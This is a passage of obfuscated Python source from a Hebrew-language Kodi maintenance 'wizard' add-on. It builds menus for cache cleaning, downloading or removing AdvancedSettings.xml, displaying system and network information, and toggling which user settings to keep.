	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOOOO000000O0OOOO .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2901
	if OOOOO000000O0OOOO =='true':#line:2902
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOOO00000OO0O0000 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2903
		addFile ('--- ניקוי קאש בהפעלה: %s'%O000OOO00OOOO0000 .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2904
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO0O0OO0OOO0OO00O .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2905
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0OO0000O0OO0OO00 .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2906
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2907
	addFile ('Include Video Cache in Clear Cache: %s'%OO000O0O00O000000 .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2908
	if OO000O0O00O000000 =='true':#line:2909
		addFile ('--- Include All Video Addons: %s'%O00O0OO000O0O00O0 .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- Include Bob: %s'%O000OOOO0OOO0O0OO .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2911
		addFile ('--- Include Phoenix: %s'%OOOO0000000O00000 .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2912
		addFile ('--- Include Specto: %s'%O000000O00O000OOO .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include Exodus: %s'%O00O0OOOOO0OOO00O .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Salts: %s'%O0OOOO0000OO00000 .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Include Salts HD Lite: %s'%OOOO0O00OOO000OO0 .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Include One Channel: %s'%O0000O0O00000O0OO .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2917
		addFile ('--- Include Genesis: %s'%O00O0000OOO00O00O .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2920
	setView ('files','viewType')#line:2921
def advancedWindow (url =None ):#line:2923
	if not ADVANCEDFILE =='http://':#line:2924
		if url ==None :#line:2925
			O0O000O00O00O0O0O =wiz .workingURL (ADVANCEDFILE )#line:2926
			O0O000OOOO0000OO0 =uservar .ADVANCEDFILE #line:2927
		else :#line:2928
			O0O000O00O00O0O0O =wiz .workingURL (url )#line:2929
			O0O000OOOO0000OO0 =url #line:2930
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2931
		if os .path .exists (ADVANCED ):#line:2932
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2933
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2934
		if O0O000O00O00O0O0O ==True :#line:2935
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2936
			OOO0O00O0O000O0OO =wiz .openURL (O0O000OOOO0000OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2937
			O0O00O0OOOO000000 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOO0O00O0O000O0OO )#line:2938
			if len (O0O00O0OOOO000000 )>0 :#line:2939
				for O00OOOO0OOOOOO00O ,O00O000OO0O0O00O0 ,url ,O0OOO0OOOO0OOO0OO ,O0OOO0OOOOOOO0000 ,O0000O00O000O0000 in O0O00O0OOOO000000 :#line:2940
					if O00O000OO0O0O00O0 .lower ()=="yes":#line:2941
						addDir ("[B]%s[/B]"%O00OOOO0OOOOOO00O ,'advancedsetting',url ,description =O0000O00O000O0000 ,icon =O0OOO0OOOO0OOO0OO ,fanart =O0OOO0OOOOOOO0000 ,themeit =THEME3 )#line:2942
					else :#line:2943
						addFile (O00OOOO0OOOOOO00O ,'writeadvanced',O00OOOO0OOOOOO00O ,url ,description =O0000O00O000O0000 ,icon =O0OOO0OOOO0OOO0OO ,fanart =O0OOO0OOOOOOO0000 ,themeit =THEME2 )#line:2944
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2945
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O0O000O00O00O0O0O )#line:2946
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2947
def writeAdvanced (O000OO0OOOO00O0OO ,OO00OO0OO0OOOOO0O ):#line:2949
	O0O00O0OOOOOO000O =wiz .workingURL (OO00OO0OO0OOOOO0O )#line:2950
	if O0O00O0OOOOOO000O ==True :#line:2951
		if os .path .exists (ADVANCED ):O0OOO0OO00O0OO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O000OO0OOOO00O0OO ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2952
		else :O0OOO0OO00O0OO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O000OO0OOOO00O0OO ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2953
		if O0OOO0OO00O0OO0OO ==1 :#line:2955
			OOOOOO00O00OOOOOO =wiz .openURL (OO00OO0OO0OOOOO0O )#line:2956
			OO0OOO0OOO00O0000 =open (ADVANCED ,'w');#line:2957
			OO0OOO0OOO00O0000 .write (OOOOOO00O00OOOOOO )#line:2958
			OO0OOO0OOO00O0000 .close ()#line:2959
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2960
			wiz .killxbmc (True )#line:2961
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2962
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0O00O0OOOOOO000O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2963
def viewAdvanced ():#line:2965
	OO0O00O0O00000O00 =open (ADVANCED )#line:2966
	OO000OOOO0O0O000O =OO0O00O0O00000O00 .read ().replace ('\t','    ')#line:2967
	wiz .TextBox (ADDONTITLE ,OO000OOOO0O0O000O )#line:2968
	OO0O00O0O00000O00 .close ()#line:2969
def removeAdvanced ():#line:2971
	if os .path .exists (ADVANCED ):#line:2972
		wiz .removeFile (ADVANCED )#line:2973
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2974
def showAutoAdvanced ():#line:2976
	notify .autoConfig ()#line:2977
def getIP ():#line:2979
	O0O0OOO0O0OO00OO0 ='http://whatismyipaddress.com/'#line:2980
	if not wiz .workingURL (O0O0OOO0O0OO00OO0 ):return 'Unknown','Unknown','Unknown'#line:2981
	O0O0O0O0OO0O00O0O =wiz .openURL (O0O0OOO0O0OO00OO0 ).replace ('\n','').replace ('\r','')#line:2982
	if not 'Access Denied'in O0O0O0O0OO0O00O0O :#line:2983
		O00O00O0O00O00OOO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0O0O0O0OO0O00O0O )#line:2984
		O0O000O0OOOOO0000 =O00O00O0O00O00OOO [0 ]if (len (O00O00O0O00O00OOO )>0 )else 'Unknown'#line:2985
		OO000OOO0O0OOOO0O =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0O0O0O0OO0O00O0O )#line:2986
		O0O00000OO000O0O0 =OO000OOO0O0OOOO0O [0 ]if (len (OO000OOO0O0OOOO0O )>0 )else 'Unknown'#line:2987
		O00OO0OOOO0OOO0O0 =OO000OOO0O0OOOO0O [1 ]+', '+OO000OOO0O0OOOO0O [2 ]+', '+OO000OOO0O0OOOO0O [3 ]if (len (OO000OOO0O0OOOO0O )>2 )else 'Unknown'#line:2988
		return O0O000O0OOOOO0000 ,O0O00000OO000O0O0 ,O00OO0OOOO0OOO0O0 #line:2989
	else :return 'Unknown','Unknown','Unknown'#line:2990
def systemInfo ():#line:2992
	O0O0OO0O0OOOOO0OO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3006
	O000O000O00O0OO0O =[];O0OOOOOOO0OO000O0 =0 #line:3007
	for O00O00OOOO0OO0O00 in O0O0OO0O0OOOOO0OO :#line:3008
		OO0000OO0O00OOO0O =wiz .getInfo (O00O00OOOO0OO0O00 )#line:3009
		OOOO0O0O0O00OO00O =0 #line:3010
		while OO0000OO0O00OOO0O =="Busy"and OOOO0O0O0O00OO00O <10 :#line:3011
			OO0000OO0O00OOO0O =wiz .getInfo (O00O00OOOO0OO0O00 );OOOO0O0O0O00OO00O +=1 ;wiz .log ("%s sleep %s"%(O00O00OOOO0OO0O00 ,str (OOOO0O0O0O00OO00O )));xbmc .sleep (1000 )#line:3012
		O000O000O00O0OO0O .append (OO0000OO0O00OOO0O )#line:3013
		O0OOOOOOO0OO000O0 +=1 #line:3014
	O000OO0O0OOOOOOO0 =O000O000O00O0OO0O [8 ]if 'Una'in O000O000O00O0OO0O [8 ]else wiz .convertSize (int (float (O000O000O00O0OO0O [8 ][:-8 ]))*1024 *1024 )#line:3015
	OOOOO0000OOO0OO0O =O000O000O00O0OO0O [9 ]if 'Una'in O000O000O00O0OO0O [9 ]else wiz .convertSize (int (float (O000O000O00O0OO0O [9 ][:-8 ]))*1024 *1024 )#line:3016
	OO00O0O0O00OOOOOO =O000O000O00O0OO0O [10 ]if 'Una'in O000O000O00O0OO0O [10 ]else wiz .convertSize (int (float (O000O000O00O0OO0O [10 ][:-8 ]))*1024 *1024 )#line:3017
	OOO0O0000O0O0000O =wiz .convertSize (int (float (O000O000O00O0OO0O [11 ][:-2 ]))*1024 *1024 )#line:3018
	O00000O0OOOOOOOOO =wiz .convertSize (int (float (O000O000O00O0OO0O [12 ][:-2 ]))*1024 *1024 )#line:3019
	OO00000OO000O0O00 =wiz .convertSize (int (float (O000O000O00O0OO0O [13 ][:-2 ]))*1024 *1024 )#line:3020
	OOOOOOOO0OOOOO00O ,OO00OOO00000O0000 ,OOO00000OO00O00O0 =getIP ()#line:3021
	OO00000O0OO0OO0OO =[];O0OOO00OOO0O0O00O =[];OOO0000OO0O00O0OO =[];O000OOO000O000OOO =[];OO000000OO0O0OOO0 =[];OO0OOO0OO0OO00O0O =[];OOOO0O00000O000O0 =[]#line:3023
	O0000000OOOO0000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3025
	for OOOOO00OO0000000O in sorted (O0000000OOOO0000O ,key =lambda O000O0OOO000O00O0 :O000O0OOO000O00O0 ):#line:3026
		O0OOO00O0O0OO0O0O =os .path .split (OOOOO00OO0000000O [:-1 ])[1 ]#line:3027
		if O0OOO00O0O0OO0O0O =='packages':continue #line:3028
		OO0O0OOO00O0O0O0O =os .path .join (OOOOO00OO0000000O ,'addon.xml')#line:3029
		if os .path .exists (OO0O0OOO00O0O0O0O ):#line:3030
			O0000O00O0000O00O =open (OO0O0OOO00O0O0O0O )#line:3031
			O00OO0OO000000000 =O0000O00O0000O00O .read ()#line:3032
			O0000OO00000000OO =re .compile ("<provides>(.+?)</provides>").findall (O00OO0OO000000000 )#line:3033
			if len (O0000OO00000000OO )==0 :#line:3034
				if O0OOO00O0O0OO0O0O .startswith ('skin'):OOOO0O00000O000O0 .append (O0OOO00O0O0OO0O0O )#line:3035
				if O0OOO00O0O0OO0O0O .startswith ('repo'):OO000000OO0O0OOO0 .append (O0OOO00O0O0OO0O0O )#line:3036
				else :OO0OOO0OO0OO00O0O .append (O0OOO00O0O0OO0O0O )#line:3037
			elif not (O0000OO00000000OO [0 ]).find ('executable')==-1 :O000OOO000O000OOO .append (O0OOO00O0O0OO0O0O )#line:3038
			elif not (O0000OO00000000OO [0 ]).find ('video')==-1 :OOO0000OO0O00O0OO .append (O0OOO00O0O0OO0O0O )#line:3039
			elif not (O0000OO00000000OO [0 ]).find ('audio')==-1 :O0OOO00OOO0O0O00O .append (O0OOO00O0O0OO0O0O )#line:3040
			elif not (O0000OO00000000OO [0 ]).find ('image')==-1 :OO00000O0OO0OO0OO .append (O0OOO00O0O0OO0O0O )#line:3041
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3043
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O000O00O0OO0O [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3044
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O000O00O0OO0O [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3045
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3046
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O000O00O0OO0O [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3047
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O000O00O0OO0O [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3048
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O000O00O0OO0O [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O000O00O0OO0O [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OO0O0OOOOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0000OOO0OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0O0O00OOOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0000O0O0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O0OOOOOOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00000OO000O0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O000O00O0OO0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOO0OOOOO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOO00000O0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00000OO00O00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O000O00O0OO0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	OO00O0OO0OO0O0O0O =len (OO00000O0OO0OO0OO )+len (O0OOO00OOO0O0O00O )+len (OOO0000OO0O00O0OO )+len (O000OOO000O000OOO )+len (OO0OOO0OO0OO00O0O )+len (OOOO0O00000O000O0 )+len (OO000000OO0O0OOO0 )#line:3071
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO00O0OO0OO0O0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0000OO0O00O0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000OOO000O000OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOO00OOO0O0O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00000O0OO0OO0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO000000OO0O0OOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3077
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO0O00000O000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3078
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OOO0OO0OO00O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3079
def Menu ():#line:3080
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3081
def saveMenu ():#line:3083
	OOOO0OO0OO0O0OOO0 ='[COLOR yellow]מופעל[/COLOR]';O000OO00O0OOO00O0 ='[COLOR blue]מבוטל[/COLOR]'#line:3085
	OOO0O0OO00O0000O0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3086
	O000OO00OOOOO0OOO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3087
	O0O0O00OOOO00O00O ='true'if KEEPINFO =='true'else 'false'#line:3088
	OOOO0O000O0OO00O0 ='true'if KEEPSOUND =='true'else 'false'#line:3090
	OO000OO0000000O00 ='true'if KEEPVIEW =='true'else 'false'#line:3091
	OOOO000OO00OO0OO0 ='true'if KEEPSKIN =='true'else 'false'#line:3092
	O00O0O000O000O0OO ='true'if KEEPSKIN2 =='true'else 'false'#line:3093
	O0O00O000OOOOO0OO ='true'if KEEPSKIN3 =='true'else 'false'#line:3094
	O0OO00O00OOO00OOO ='true'if KEEPADDONS =='true'else 'false'#line:3095
	O0OO0O0O00O0000O0 ='true'if KEEPPVR =='true'else 'false'#line:3096
	OOOOO0O00000O000O ='true'if KEEPTVLIST =='true'else 'false'#line:3097
	O0000O0OO0O0O00O0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3098
	O0O0O0O00OO000000 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3099
	OOO0O0OO000000000 ='true'if KEEPHUBTV =='true'else 'false'#line:3100
	OO0OOOOOO0OOOOO0O ='true'if KEEPHUBVOD =='true'else 'false'#line:3101
	OOOOO0OO0O0O0000O ='true'if KEEPHUBSPORT =='true'else 'false'#line:3102
	OO00000000O000OO0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3103
	O00O0O0OOOOO0OO0O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3104
	O0OO0OOO0OOO000O0 ='true'if KEEPHUBMENU =='true'else 'false'#line:3105
	OOO0OO0000OO0OOOO ='true'if KEEPPLAYLIST =='true'else 'false'#line:3106
	OO0O0O000000OO0O0 ='true'if KEEPTRAKT =='true'else 'false'#line:3107
	O00O0O00000OO000O ='true'if KEEPREAL =='true'else 'false'#line:3108
	O0000O0O0O00OOOO0 ='true'if KEEPRD2 =='true'else 'false'#line:3109
	OO0OO0O0O0000000O ='true'if KEEPTORNET =='true'else 'true'#line:3110
	O000000O0O000O000 ='true'if KEEPLOGIN =='true'else 'false'#line:3111
	O0O0OO00O00000O00 ='true'if KEEPSOURCES =='true'else 'false'#line:3112
	O0OO00O0O00O000O0 ='true'if KEEPADVANCED =='true'else 'false'#line:3113
	O0OOOO0O0000O0O00 ='true'if KEEPPROFILES =='true'else 'false'#line:3114
	O0OO0OOO0OO0OO0O0 ='true'if KEEPFAVS =='true'else 'false'#line:3115
	OOO0000O0OOO0O000 ='true'if KEEPREPOS =='true'else 'false'#line:3116
	O00O0O0OOOO0O0OO0 ='true'if KEEPSUPER =='true'else 'false'#line:3117
	OOO0O0000O0OO000O ='true'if KEEPWHITELIST =='true'else 'false'#line:3118
	O0O0000O0O0000OOO ='true'if KEEPWEATHER =='true'else 'false'#line:3119
	O0OOO0O00O0000O0O ='true'if KEEPVICTORY =='true'else 'false'#line:3120
	O0OO0O0O0OO00O0O0 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3121
	if OOO0O0000O0OO000O =='true':#line:3123
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3124
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3125
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3126
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3127
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת חשבון RD:  '%O00O0O00000OO000O .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת חשבון טראקט:  '%OO0O0O000000OO0O0 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת מועדפים:  '%O0OO0OOO0OO0OO0O0 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0OO0O0O00O0000O0 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0OOO0O00O0000O0O .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת חשבון טלמדיה:  '%O0OO0O0O0OO00O0O0 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OOOOO0O00000O000O .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת אריח סרטים:  '%O0000O0OO0O0O00O0 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת אריח סדרות:  '%O0O0O0O00OO000000 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת אריח טלויזיה:  '%OOO0O0OO000000000 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OO0OOOOOO0OOOOO0O .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת אריח ספורט:  '%OOOOO0OO0O0O0000O .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת אריח ילדים:  '%OO00000000O000OO0 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת אריח מוסיקה:  '%O00O0O0OOOOO0OO0O .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O0OO0OOO0OOO000O0 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת כל האריחים בסקין:  '%OOOO000OO00OO0OO0 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3148
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0O0000O0O0000OOO .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
